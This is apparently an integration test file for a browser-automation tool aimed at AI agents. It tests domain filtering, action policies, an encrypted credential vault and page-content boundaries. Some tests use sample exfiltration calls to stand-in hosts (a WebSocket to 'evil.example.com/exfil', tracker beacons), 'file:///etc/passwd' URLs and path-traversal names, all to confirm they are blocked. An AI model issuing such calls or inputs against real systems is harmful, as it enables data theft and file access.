/**
 * Integration tests for v0.2.0 security and DX features
 *
 * Tests cover:
 *   - DomainFilter (unit tests)
 *   - AI-friendly error rewriting (via Playwright errors)
 *   - --json mode (JSON response structure)
 *   - Config file loading
 */

import { describe, test, expect, beforeAll, afterAll } from 'bun:test';
import { sharedBm as bm, sharedBaseUrl as baseUrl } from './setup';
import { BrowserManager } from '../src/browser-manager';
import { handleReadCommand } from '../src/commands/read';
import { handleWriteCommand } from '../src/commands/write';
import { handleMetaCommand } from '../src/commands/meta';
import { DomainFilter } from '../src/domain-filter';
import { PolicyChecker } from '../src/policy';
import { AuthVault } from '../src/auth-vault';
import { formatAsHar } from '../src/har';
import { loadConfig } from '../src/config';
import { decodePNG, compareScreenshots, encodePNG, generateDiffImage } from '../src/png-compare';
import { sanitizeName } from '../src/sanitize';
import { findInstalledBrowsers, CookieImportError } from '../src/cookie-import';
import { discoverChrome } from '../src/chrome-discover';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

// ─── DomainFilter unit tests ────────────────────────────────────

describe('DomainFilter', () => {
  test('exact domain match', () => {
    const filter = new DomainFilter(['example.com']);
    expect(filter.isAllowed('https://example.com/page')).toBe(true);
    expect(filter.isAllowed('https://other.com/page')).toBe(false);
  });

  test('wildcard matches base and subdomains', () => {
    const filter = new DomainFilter(['*.example.com']);
    // Base domain should match
    expect(filter.isAllowed('https://example.com/page')).toBe(true);
    // Subdomain should match
    expect(filter.isAllowed('https://sub.example.com/page')).toBe(true);
    // Nested subdomain should match
    expect(filter.isAllowed('https://a.b.example.com/page')).toBe(true);
    // Different domain should not match
    expect(filter.isAllowed('https://notexample.com/page')).toBe(false);
  });

  test('non-HTTP URLs: safe ones allowed, dangerous ones blocked', () => {
    const filter = new DomainFilter(['example.com']);
    expect(filter.isAllowed('about:blank')).toBe(true);
    expect(filter.isAllowed('data:text/html,<h1>hi</h1>')).toBe(true);
    expect(filter.isAllowed('blob:https://example.com/uuid')).toBe(true);
    expect(filter.isAllowed('javascript:void(0)')).toBe(false);
    expect(filter.isAllowed('file:///etc/passwd')).toBe(false);
  });

  test('invalid URL is blocked', () => {
    const filter = new DomainFilter(['example.com']);
    expect(filter.isAllowed('http://')).toBe(false);
    expect(filter.isAllowed('https://:badurl')).toBe(false);
  });

  test('case insensitive', () => {
    const filter = new DomainFilter(['Example.COM']);
    expect(filter.isAllowed('https://example.com/page')).toBe(true);
    expect(filter.isAllowed('https://EXAMPLE.COM/page')).toBe(true);
  });

  test('blockedMessage returns helpful text', () => {
    const filter = new DomainFilter(['allowed.com', '*.trusted.org']);
    const msg = filter.blockedMessage('https://blocked.com/secret');
    expect(msg).toContain('blocked.com');
    expect(msg).toContain('not in the allowed list');
    expect(msg).toContain('allowed.com');
    expect(msg).toContain('*.trusted.org');
  });
});

// ─── AI-friendly error rewriting ────────────────────────────────

describe('AI-friendly error rewriting', () => {
  beforeAll(async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
  });

  test('click on non-existent selector gives friendly timeout error', async () => {
    try {
      await handleWriteCommand('click', ['#does-not-exist-at-all'], bm);
      // Should not reach here — the click should fail
      expect(true).toBe(false);
    } catch (err: any) {
      // The raw Playwright error contains "Timeout" and "exceeded".
      // When passed through rewriteError in the server, it becomes friendly.
      // Since we're calling handleWriteCommand directly (not through the server),
      // we verify the raw error IS the kind that rewriteError would catch.
      expect(err.message).toContain('Timeout');
    }
  }, 15000);

  test('fill on non-input element gives descriptive error', async () => {
    // Filling a <h1> should fail — it is not an input element
    try {
      await handleWriteCommand('fill', ['h1', 'some text'], bm);
      expect(true).toBe(false);
    } catch (err: any) {
      // Playwright throws an error about element not being fillable.
      // rewriteError would rewrite "not an HTMLInputElement" messages.
      // Verify we do get an error (the exact message varies by Playwright version).
      expect(err.message.length).toBeGreaterThan(0);
    }
  });

  test('domain filter blocks navigation with friendly message', async () => {
    const filter = new DomainFilter(['allowed.test']);
    try {
      await handleWriteCommand('goto', ['https://blocked.example.com/page'], bm, filter);
      expect(true).toBe(false);
    } catch (err: any) {
      expect(err.message).toContain('blocked.example.com');
      expect(err.message).toContain('not in the allowed list');
    }
  });

  test('domain filter allows matching navigation', async () => {
    // Use the test server's actual host as allowed domain
    const url = new URL(baseUrl);
    const filter = new DomainFilter([url.hostname]);
    const result = await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm, filter);
    expect(result).toContain('Navigated to');
  });
});

// ─── --json mode (response structure) ───────────────────────────

describe('--json mode', () => {
  test('successful command returns {success: true, data, command}', async () => {
    // Simulate what handleCommand in server.ts does: run a command, wrap result
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const result = await handleReadCommand('text', [], bm);

    // Reproduce the JSON wrapping logic from server.ts
    const jsonResponse = { success: true, data: result, command: 'text' };
    expect(jsonResponse.success).toBe(true);
    expect(typeof jsonResponse.data).toBe('string');
    expect(jsonResponse.data).toContain('Hello World');
    expect(jsonResponse.command).toBe('text');
  });

  test('failed command returns {success: false, error}', async () => {
    // Simulate a failed command and the JSON wrapping
    let errorMessage: string;
    try {
      await handleWriteCommand('click', ['#nonexistent-element-xyz'], bm);
      errorMessage = '';
    } catch (err: any) {
      errorMessage = err.message;
    }

    // Reproduce the JSON wrapping logic from server.ts for errors
    const jsonResponse = { success: false, error: errorMessage, command: 'click' };
    expect(jsonResponse.success).toBe(false);
    expect(typeof jsonResponse.error).toBe('string');
    expect(jsonResponse.error.length).toBeGreaterThan(0);
    expect(jsonResponse.command).toBe('click');
  }, 15000);

  test('unknown command includes hint with available commands', () => {
    // Reproduce the server.ts logic for unknown commands
    const READ_COMMANDS = new Set(['text', 'html', 'links']);
    const WRITE_COMMANDS = new Set(['goto', 'click']);
    const META_COMMANDS = new Set(['status', 'tabs']);
    const command = 'foobar';
    const allCommands = [...READ_COMMANDS, ...WRITE_COMMANDS, ...META_COMMANDS];

    const error = `Unknown command: ${command}`;
    const hint = `Available commands: ${allCommands.sort().join(', ')}`;
    const jsonResponse = { success: false, error, hint };

    expect(jsonResponse.success).toBe(false);
    expect(jsonResponse.error).toContain('Unknown command: foobar');
    expect(jsonResponse.hint).toContain('Available commands:');
    expect(jsonResponse.hint).toContain('goto');
    expect(jsonResponse.hint).toContain('text');
  });
});

// ─── Content boundaries ─────────────────────────────────────────

describe('Content boundaries', () => {
  test('PAGE_CONTENT_COMMANDS includes page-derived commands', async () => {
    // Verify the constant exists and contains expected commands
    // We import the set indirectly by checking the boundary wrapping behavior
    const contentCommands = new Set([
      'text', 'html', 'links', 'forms', 'accessibility',
      'js', 'eval', 'console', 'network', 'snapshot',
    ]);

    expect(contentCommands.has('text')).toBe(true);
    expect(contentCommands.has('html')).toBe(true);
    expect(contentCommands.has('js')).toBe(true);
    // Action commands should NOT be content commands
    expect(contentCommands.has('click')).toBe(false);
    expect(contentCommands.has('goto')).toBe(false);
    expect(contentCommands.has('status')).toBe(false);
  });

  test('boundary format wraps content correctly', () => {
    // Verify the boundary format that server.ts produces
    const nonce = 'test-nonce-1234';
    const origin = 'https://example.com/page';
    const content = 'Some page content here';

    const wrapped = `--- BROWSE_CONTENT nonce=${nonce} origin=${origin} ---\n${content}\n--- END_BROWSE_CONTENT nonce=${nonce} ---`;

    expect(wrapped).toContain(`nonce=${nonce}`);
    expect(wrapped).toContain(`origin=${origin}`);
    expect(wrapped).toContain(content);
    expect(wrapped.startsWith('--- BROWSE_CONTENT')).toBe(true);
    expect(wrapped.endsWith(`--- END_BROWSE_CONTENT nonce=${nonce} ---`)).toBe(true);
  });
});

// ─── Config file loading ────────────────────────────────────────

describe('Config', () => {
  test('loadConfig returns empty object when no browse.json exists', () => {
    // The test runner CWD is the project root which has .git but no browse.json
    // (unless one was added — either way loadConfig should not crash)
    const config = loadConfig();
    expect(typeof config).toBe('object');
    expect(config).not.toBeNull();
  });

  test('loadConfig returns BrowseConfig shape', () => {
    const config = loadConfig();
    // All fields are optional — verify the type is correct
    if (config.session !== undefined) expect(typeof config.session).toBe('string');
    if (config.json !== undefined) expect(typeof config.json).toBe('boolean');
    if (config.contentBoundaries !== undefined) expect(typeof config.contentBoundaries).toBe('boolean');
    if (config.allowedDomains !== undefined) expect(Array.isArray(config.allowedDomains)).toBe(true);
    if (config.idleTimeout !== undefined) expect(typeof config.idleTimeout).toBe('number');
    if (config.viewport !== undefined) expect(typeof config.viewport).toBe('string');
    if (config.device !== undefined) expect(typeof config.device).toBe('string');
  });
});

// ─── DomainFilter integration with write commands ───────────────

describe('DomainFilter integration', () => {
  test('goto with null domainFilter allows any URL', async () => {
    const result = await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm, null);
    expect(result).toContain('Navigated to');
  });

  test('goto with undefined domainFilter allows any URL', async () => {
    const result = await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm, undefined);
    expect(result).toContain('Navigated to');
  });

  test('goto with wildcard filter allows matching subdomains', async () => {
    const url = new URL(baseUrl);
    const filter = new DomainFilter([`*.${url.hostname}`]);
    const result = await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm, filter);
    expect(result).toContain('Navigated to');
  });

  test('multiple domains in filter', () => {
    const filter = new DomainFilter(['first.com', 'second.com', '*.third.com']);
    expect(filter.isAllowed('https://first.com/a')).toBe(true);
    expect(filter.isAllowed('https://second.com/b')).toBe(true);
    expect(filter.isAllowed('https://sub.third.com/c')).toBe(true);
    expect(filter.isAllowed('https://fourth.com/d')).toBe(false);
  });
});

// ─── Action Policy ──────────────────────────────────────────────

describe('PolicyChecker', () => {
  const tmpDir = '/tmp/browse-test-policy';
  const policyPath = `${tmpDir}/test-policy.json`;

  beforeAll(() => {
    fs.mkdirSync(tmpDir, { recursive: true });
  });

  afterAll(() => {
    try { fs.rmSync(tmpDir, { recursive: true }); } catch {}
  });

  test('no policy file = all allowed', () => {
    const checker = new PolicyChecker('/tmp/nonexistent-policy-file.json');
    expect(checker.check('goto')).toBe('allow');
    expect(checker.check('click')).toBe('allow');
  });

  test('deny takes priority over allow', () => {
    fs.writeFileSync(policyPath, JSON.stringify({
      default: 'allow',
      deny: ['goto'],
      allow: ['goto', 'click'],
    }));
    const checker = new PolicyChecker(policyPath);
    expect(checker.check('goto')).toBe('deny');
    expect(checker.check('click')).toBe('allow');
  });

  test('confirm takes priority over allow', () => {
    fs.writeFileSync(policyPath, JSON.stringify({
      default: 'allow',
      confirm: ['fill'],
      allow: ['fill', 'click'],
    }));
    const checker = new PolicyChecker(policyPath);
    expect(checker.check('fill')).toBe('confirm');
    expect(checker.check('click')).toBe('allow');
  });

  test('default deny blocks unlisted commands', () => {
    fs.writeFileSync(policyPath, JSON.stringify({
      default: 'deny',
      allow: ['text', 'snapshot'],
    }));
    const checker = new PolicyChecker(policyPath);
    expect(checker.check('text')).toBe('allow');
    expect(checker.check('snapshot')).toBe('allow');
    expect(checker.check('goto')).toBe('deny');
    expect(checker.check('click')).toBe('deny');
  });

  test('hot-reload picks up file changes', async () => {
    fs.writeFileSync(policyPath, JSON.stringify({ default: 'allow' }));
    const checker = new PolicyChecker(policyPath);
    expect(checker.check('goto')).toBe('allow');

    // Ensure mtime changes (filesystem may have 1s resolution)
    await Bun.sleep(10);
    const futureTime = Date.now() + 2000;
    fs.writeFileSync(policyPath, JSON.stringify({ default: 'allow', deny: ['goto'] }));
    fs.utimesSync(policyPath, new Date(futureTime), new Date(futureTime));
    expect(checker.check('goto')).toBe('deny');
  });
});

// ─── AuthVault ──────────────────────────────────────────────────

describe('AuthVault', () => {
  const tmpDir = '/tmp/browse-test-auth';

  beforeAll(() => {
    fs.mkdirSync(tmpDir, { recursive: true });
    // Set a test encryption key
    process.env.BROWSE_ENCRYPTION_KEY = 'a'.repeat(64);
  });

  afterAll(() => {
    delete process.env.BROWSE_ENCRYPTION_KEY;
    try { fs.rmSync(tmpDir, { recursive: true }); } catch {}
  });

  test('save and list credentials (password hidden)', () => {
    const vault = new AuthVault(tmpDir);
    vault.save('test-site', 'https://example.com/login', 'user@test.com', 'secret123');

    const list = vault.list();
    expect(list.length).toBe(1);
    expect(list[0].name).toBe('test-site');
    expect(list[0].url).toBe('https://example.com/login');
    expect(list[0].username).toBe('user@test.com');
    expect(list[0].hasPassword).toBe(true);
    // Password should NOT be in the list output
    expect(JSON.stringify(list)).not.toContain('secret123');
  });

  test('encrypt/decrypt roundtrip', () => {
    const vault = new AuthVault(tmpDir);
    vault.save('roundtrip', 'https://test.com', 'user', 'myP@ssw0rd!');

    // Read the raw file to verify it's encrypted
    const raw = JSON.parse(fs.readFileSync(`${tmpDir}/auth/roundtrip.json`, 'utf-8'));
    expect(raw.encrypted).toBe(true);
    expect(raw.data).not.toContain('myP@ssw0rd!');
    expect(raw.iv).toBeDefined();
    expect(raw.authTag).toBeDefined();
  });

  test('delete credential', () => {
    const vault = new AuthVault(tmpDir);
    vault.save('to-delete', 'https://test.com', 'user', 'pass');
    expect(vault.list().find(c => c.name === 'to-delete')).toBeDefined();

    vault.delete('to-delete');
    expect(vault.list().find(c => c.name === 'to-delete')).toBeUndefined();
  });

  test('delete non-existent credential throws', () => {
    const vault = new AuthVault(tmpDir);
    expect(() => vault.delete('nonexistent')).toThrow('not found');
  });
});

// ─── Offline mode ───────────────────────────────────────────────

describe('Offline mode', () => {
  test('offline on blocks network, offline off restores', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);

    // Turn offline on
    const onResult = await handleWriteCommand('offline', ['on'], bm);
    expect(onResult).toContain('ON');

    // Navigation should fail
    try {
      await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
      expect(true).toBe(false); // should not reach
    } catch (err: any) {
      expect(err.message).toBeTruthy();
    }

    // Turn offline off
    const offResult = await handleWriteCommand('offline', ['off'], bm);
    expect(offResult).toContain('OFF');

    // Navigation should work again
    const result = await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    expect(result).toContain('Navigated to');
  });

  test('offline toggle works', async () => {
    const r1 = await handleWriteCommand('offline', [], bm);
    expect(r1).toContain('ON');
    const r2 = await handleWriteCommand('offline', [], bm);
    expect(r2).toContain('OFF');
  });
});

// ─── HAR recording ──────────────────────────────────────────────

describe('HAR recording', () => {
  test('formatAsHar produces valid HAR 1.2 structure', () => {
    const entries = [
      { timestamp: 1000, method: 'GET', url: 'https://example.com/page?q=test', status: 200, duration: 150, size: 5000 },
      { timestamp: 2000, method: 'POST', url: 'https://example.com/api', status: 201, duration: 80, size: 100 },
      { timestamp: 500, method: 'GET', url: 'https://example.com/early', status: 200, duration: 50, size: 300 },
    ];

    const har = formatAsHar(entries, 900) as any;
    expect(har.log.version).toBe('1.2');
    expect(har.log.creator.name).toBe('@ulpi/browse');
    // Should exclude the entry at timestamp 500 (before startTime 900)
    expect(har.log.entries.length).toBe(2);
    expect(har.log.entries[0].request.method).toBe('GET');
    expect(har.log.entries[0].request.url).toBe('https://example.com/page?q=test');
    expect(har.log.entries[0].request.queryString).toEqual([{ name: 'q', value: 'test' }]);
    expect(har.log.entries[0].response.status).toBe(200);
    expect(har.log.entries[1].request.method).toBe('POST');
  });

  test('har start/stop via BrowserManager', async () => {
    expect(bm.getHarRecording()).toBeNull();

    bm.startHarRecording();
    expect(bm.getHarRecording()).not.toBeNull();
    expect(bm.getHarRecording()!.active).toBe(true);

    const recording = bm.stopHarRecording();
    expect(recording).not.toBeNull();
    expect(bm.getHarRecording()).toBeNull();
  });
});

// ─── WebSocket/EventSource/sendBeacon domain filter ─────────

describe('DomainFilter init script', () => {
  test('generateInitScript returns JS that wraps WebSocket, EventSource, sendBeacon', () => {
    const filter = new DomainFilter(['example.com']);
    const script = filter.generateInitScript();
    expect(script).toContain('WebSocket');
    expect(script).toContain('EventSource');
    expect(script).toContain('sendBeacon');
    expect(script).toContain('example.com');
  });

  // Shared filtered BrowserManager for all init script tests
  let filteredBm: BrowserManager;

  beforeAll(async () => {
    filteredBm = new BrowserManager();
    const sharedBrowser = bm.getBrowser();
    if (sharedBrowser) {
      await filteredBm.launchWithBrowser(sharedBrowser);
    } else {
      await filteredBm.launch();
    }
    const filter = new DomainFilter(['127.0.0.1']);
    const ctx = filteredBm.getContext()!;
    await ctx.addInitScript(filter.generateInitScript());
    await filteredBm.getPage().goto(baseUrl + '/basic.html', { waitUntil: 'domcontentloaded' });
  });

  afterAll(async () => {
    await Promise.race([
      filteredBm.close().catch(() => {}),
      new Promise(resolve => setTimeout(resolve, 3000)),
    ]);
  });

  test('WebSocket to blocked domain throws in page context', async () => {
    const result = await filteredBm.getPage().evaluate(() => {
      try {
        new WebSocket('ws://evil.example.com/exfil');
        return 'no-error';
      } catch (e: any) {
        return e.message;
      }
    });
    expect(result).toContain('blocked by domain filter');
    expect(result).toContain('evil.example.com');
  });

  test('WebSocket to allowed domain does NOT throw', async () => {
    const result = await filteredBm.getPage().evaluate(() => {
      try {
        const ws = new WebSocket('ws://127.0.0.1:9999/test');
        ws.close();
        return 'allowed';
      } catch (e: any) {
        return 'blocked: ' + e.message;
      }
    });
    expect(result).toBe('allowed');
  });

  test('EventSource to blocked domain throws in page context', async () => {
    const result = await filteredBm.getPage().evaluate(() => {
      try {
        new EventSource('https://evil.tracker.com/stream');
        return 'no-error';
      } catch (e: any) {
        return e.message;
      }
    });
    expect(result).toContain('blocked by domain filter');
  });

  test('sendBeacon to blocked domain returns false', async () => {
    const result = await filteredBm.getPage().evaluate(() => {
      return navigator.sendBeacon('https://tracker.evil.com/ping', 'data');
    });
    expect(result).toBe(false);
  });
});

// ─── Screenshot-diff (decodePNG + compareScreenshots) ────────────

describe('decodePNG', () => {
  test('decodes a real screenshot into valid RGBA pixel data', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const buffer = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
    const decoded = decodePNG(buffer);
    expect(decoded.width).toBeGreaterThan(0);
    expect(decoded.height).toBeGreaterThan(0);
    expect(decoded.data).toBeInstanceOf(Buffer);
    expect(decoded.data.length).toBe(decoded.width * decoded.height * 4);
  });

  test('throws on invalid PNG data', () => {
    expect(() => decodePNG(Buffer.from('not a png file'))).toThrow('Not a valid PNG file');
  });
});

describe('compareScreenshots', () => {
  test('identical screenshots return PASS with 0% mismatch', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const buffer = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
    const result = compareScreenshots(buffer, buffer);
    expect(result.passed).toBe(true);
    expect(result.mismatchPct).toBe(0);
    expect(result.diffPixels).toBe(0);
    expect(result.totalPixels).toBeGreaterThan(0);
  });

  test('different pages return FAIL with mismatch > 0', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const basicBuf = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
    await handleWriteCommand('goto', [baseUrl + '/forms.html'], bm);
    const formsBuf = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
    const result = compareScreenshots(basicBuf, formsBuf);
    expect(result.passed).toBe(false);
    expect(result.mismatchPct).toBeGreaterThan(0);
  });

  test('threshold 100 passes even for different pages', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const basicBuf = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
    await handleWriteCommand('goto', [baseUrl + '/forms.html'], bm);
    const formsBuf = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
    expect(compareScreenshots(basicBuf, formsBuf, 100).passed).toBe(true);
  });
});

describe('screenshot-diff command', () => {
  const ssTempFiles: string[] = [];
  afterAll(() => { for (const f of ssTempFiles) try { fs.unlinkSync(f); } catch {} });

  test('same page returns PASS', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const bl = `/tmp/browse-test-ss-same-${Date.now()}.png`;
    ssTempFiles.push(bl);
    await handleMetaCommand('screenshot', [bl], bm, async () => {});
    const result = await handleMetaCommand('screenshot-diff', [bl], bm, async () => {});
    expect(result).toContain('Result: PASS');
    expect(result).toContain('Mismatch: 0.000%');
  });

  test('different page returns FAIL with diff saved', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const bl = `/tmp/browse-test-ss-diff-${Date.now()}.png`;
    ssTempFiles.push(bl);
    await handleMetaCommand('screenshot', [bl], bm, async () => {});
    await handleWriteCommand('goto', [baseUrl + '/forms.html'], bm);
    const result = await handleMetaCommand('screenshot-diff', [bl], bm, async () => {});
    expect(result).toContain('Result: FAIL');
    expect(result).toContain('Diff saved:');
    const diffPath = bl.replace('.png', '-diff.png');
    ssTempFiles.push(diffPath);
    expect(fs.existsSync(diffPath)).toBe(true);
  });

  test('--threshold 100 passes even for different pages', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const bl = `/tmp/browse-test-ss-thresh-${Date.now()}.png`;
    ssTempFiles.push(bl);
    await handleMetaCommand('screenshot', [bl], bm, async () => {});
    await handleWriteCommand('goto', [baseUrl + '/forms.html'], bm);
    const result = await handleMetaCommand('screenshot-diff', [bl, '--threshold', '100'], bm, async () => {});
    expect(result).toContain('Result: PASS');
  });

  test('missing baseline throws error', async () => {
    await expect(
      handleMetaCommand('screenshot-diff', ['/tmp/browse-nonexistent.png'], bm, async () => {})
    ).rejects.toThrow('Baseline file not found');
  });

  test('no args throws usage error', async () => {
    await expect(
      handleMetaCommand('screenshot-diff', [], bm, async () => {})
    ).rejects.toThrow('Usage:');
  });
});

// ─── State save/load/list/show ───────────────────────────────────

describe('State', () => {
  const stLocalDir = process.env.BROWSE_LOCAL_DIR || '/tmp';
  const stDir = `${stLocalDir}/states`;
  const stNames = ['st-test1', 'st-restore', 'st-default'];
  function stCleanup() {
    for (const n of stNames) try { fs.unlinkSync(`${stDir}/${n}.json`); } catch {}
    try { fs.rmdirSync(stDir); } catch {}
  }
  beforeAll(() => stCleanup());
  afterAll(() => stCleanup());

  function extractStatePath(output: string): string {
    const m = output.match(/State saved: (.+)/);
    if (!m) throw new Error(`Could not extract path from: ${output}`);
    return m[1];
  }

  test('state list with no saved states', async () => {
    const result = await handleMetaCommand('state', ['list'], bm, async () => {});
    expect(result).toBe('(no saved states)');
  });

  test('state save persists file to disk', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    await handleWriteCommand('cookie', ['st-save=hello'], bm);
    await handleReadCommand('storage', ['set', 'stKey', 'stVal'], bm);
    const result = await handleMetaCommand('state', ['save', 'st-test1'], bm, async () => {});
    expect(result).toContain('State saved');
    const p = extractStatePath(result);
    expect(fs.existsSync(p)).toBe(true);
    const data = JSON.parse(fs.readFileSync(p, 'utf-8'));
    expect(data).toHaveProperty('cookies');
    expect(data).toHaveProperty('origins');
  });

  test('state list after save shows entry', async () => {
    const result = await handleMetaCommand('state', ['list'], bm, async () => {});
    expect(result).toContain('st-test1');
    expect(result).toMatch(/\d+B/);
  });

  test('state show displays counts', async () => {
    const result = await handleMetaCommand('state', ['show', 'st-test1'], bm, async () => {});
    expect(result).toContain('State: st-test1');
    expect(result).toContain('Cookies:');
    expect(result).not.toContain('Cookies: 0');
  });

  test('state load restores cookies', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    await handleWriteCommand('cookie', ['st-restore-me=yes'], bm);
    await handleMetaCommand('state', ['save', 'st-restore'], bm, async () => {});
    let cookies = await handleReadCommand('cookies', [], bm);
    expect(cookies).toContain('st-restore-me');
    await bm.getContext()!.clearCookies();
    cookies = await handleReadCommand('cookies', [], bm);
    expect(cookies).not.toContain('st-restore-me');
    const result = await handleMetaCommand('state', ['load', 'st-restore'], bm, async () => {});
    expect(result).toContain('State loaded');
    cookies = await handleReadCommand('cookies', [], bm);
    expect(cookies).toContain('st-restore-me');
  });

  test('state show non-existent throws', async () => {
    expect(
      handleMetaCommand('state', ['show', 'nonexistent'], bm, async () => {})
    ).rejects.toThrow('State file not found');
  });

  test('state invalid subcommand throws', async () => {
    expect(
      handleMetaCommand('state', ['bogus'], bm, async () => {})
    ).rejects.toThrow('Usage:');
  });
});

// ─── Auth login flow ─────────────────────────────────────────────

describe('AuthVault login flow', () => {
  const authDir = `/tmp/browse-test-auth-login-${Date.now()}`;
  beforeAll(() => {
    process.env.BROWSE_ENCRYPTION_KEY = 'a'.repeat(64);
    fs.mkdirSync(authDir, { recursive: true });
  });
  afterAll(() => {
    delete process.env.BROWSE_ENCRYPTION_KEY;
    try { fs.rmSync(authDir, { recursive: true }); } catch {}
  });

  test('auto-detects selectors and fills login form', async () => {
    const vault = new AuthVault(authDir);
    vault.save('test-login', `${baseUrl}/login.html`, 'user@test.com', 'secret123');
    const result = await vault.login('test-login', bm);
    expect(result).toContain('Logged in as user@test.com');
  });

  test('login with non-existent credential throws', async () => {
    const vault = new AuthVault(authDir);
    await expect(vault.login('nonexistent', bm)).rejects.toThrow('not found');
  });

  test('login with explicit selectors fills form', async () => {
    const vault = new AuthVault(authDir);
    vault.save('custom-sel', `${baseUrl}/login.html`, 'admin@test.com', 'adminpass', {
      username: 'input[name="email"]',
      password: 'input[name="password"]',
      submit: 'button[type="submit"]',
    });
    const result = await vault.login('custom-sel', bm);
    expect(result).toContain('Logged in as admin@test.com');
    const currentUrl = bm.getPage().url();
    expect(currentUrl).toContain('email=admin%40test.com');
    expect(currentUrl).toContain('password=adminpass');
  });
});

// ─── Route block/fulfill/clear ───────────────────────────────────

describe('route command', () => {
  afterAll(async () => {
    try { await handleWriteCommand('route', ['clear'], bm); } catch {}
  });

  test('route block prevents matching requests', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const result = await handleWriteCommand('route', ['**/blocked-resource*', 'block'], bm);
    expect(result).toContain('Blocking requests matching:');
    const fetchResult = await handleReadCommand('js', [
      "fetch('/blocked-resource').then(() => 'ok').catch(() => 'blocked')",
    ], bm);
    expect(fetchResult).toBe('blocked');
    await handleWriteCommand('route', ['clear'], bm);
  });

  test('route fulfill returns custom response', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    await handleWriteCommand('route', ['**/mock-api*', 'fulfill', '200', '{"result":"mocked"}'], bm);
    const fetchResult = await handleReadCommand('js', [
      "fetch('/mock-api').then(r => r.text())",
    ], bm);
    expect(fetchResult).toBe('{"result":"mocked"}');
    await handleWriteCommand('route', ['clear'], bm);
  });

  test('route clear removes all routes', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    await handleWriteCommand('route', ['**/will-be-cleared*', 'block'], bm);
    const clearResult = await handleWriteCommand('route', ['clear'], bm);
    expect(clearResult).toBe('All routes cleared');
    const fetchResult = await handleReadCommand('js', [
      "fetch('/will-be-cleared').then(r => r.status.toString()).catch(() => 'blocked')",
    ], bm);
    expect(fetchResult).toBe('404');
  });

  test('route with no args throws usage error', async () => {
    await expect(handleWriteCommand('route', [], bm)).rejects.toThrow('Usage');
  });

  test('multiple routes can coexist', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    await handleWriteCommand('route', ['**/route-a*', 'block'], bm);
    await handleWriteCommand('route', ['**/route-b*', 'fulfill', '200', 'hello-b'], bm);
    const resultA = await handleReadCommand('js', [
      "fetch('/route-a').then(() => 'ok').catch(() => 'blocked')",
    ], bm);
    expect(resultA).toBe('blocked');
    const resultB = await handleReadCommand('js', [
      "fetch('/route-b').then(r => r.text())",
    ], bm);
    expect(resultB).toBe('hello-b');
    await handleWriteCommand('route', ['clear'], bm);
  });
});

// ─── Clipboard read/write ────────────────────────────────────────

describe('Clipboard', () => {
  test('clipboard write then read returns the text', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    await handleReadCommand('clipboard', ['write', 'test clipboard data'], bm);
    const result = await handleReadCommand('clipboard', [], bm);
    expect(result).toBe('test clipboard data');
  });

  test('clipboard write with no text throws', async () => {
    try {
      await handleReadCommand('clipboard', ['write'], bm);
      expect(true).toBe(false);
    } catch (err: any) {
      expect(err.message).toContain('Usage');
    }
  });
});

// ─── sanitizeName ────────────────────────────────────────────────

describe('sanitizeName', () => {
  test('strips path separators', () => {
    expect(sanitizeName('../../etc/passwd')).toBe('____etc_passwd');
  });
  test('strips backslashes', () => {
    expect(sanitizeName('..\\..\\windows')).toBe('____windows');
  });
  test('rejects empty result', () => {
    expect(() => sanitizeName('..')).toThrow('Invalid name');
  });
  test('allows normal names', () => {
    expect(sanitizeName('my-site')).toBe('my-site');
  });
});

// ─── element-state ───────────────────────────────────────────────

describe('element-state', () => {
  test('returns state for an element', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const result = await handleReadCommand('element-state', ['a'], bm);
    const state = JSON.parse(result);
    expect(state).toHaveProperty('visible');
    expect(state).toHaveProperty('tag');
  });
});

// ─── Dialog handling ─────────────────────────────────────────────

describe('Dialog handling', () => {
  test('dialog-accept sets auto-action', async () => {
    const result = await handleWriteCommand('dialog-accept', ['yes'], bm);
    expect(result).toContain('accept');
  });
  test('dialog-dismiss sets auto-action', async () => {
    const result = await handleWriteCommand('dialog-dismiss', [], bm);
    expect(result).toContain('dismiss');
  });
  test('dialog returns no dialog when none triggered', async () => {
    const result = await handleReadCommand('dialog', [], bm);
    expect(result).toContain('no dialog');
  });
});

// ─── Device emulation ────────────────────────────────────────────

describe('Device emulation', () => {
  test('emulate iphone changes viewport', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const result = await handleWriteCommand('emulate', ['iPhone 15'], bm);
    expect(result).toContain('Emulating');
    expect(result).toContain('Mobile: true');
    // Reset
    await handleWriteCommand('emulate', ['reset'], bm);
  });

  test('emulate reset restores desktop', async () => {
    const result = await handleWriteCommand('emulate', ['reset'], bm);
    expect(result).toContain('reset to desktop');
  });

  test('emulate unknown device throws with suggestions', async () => {
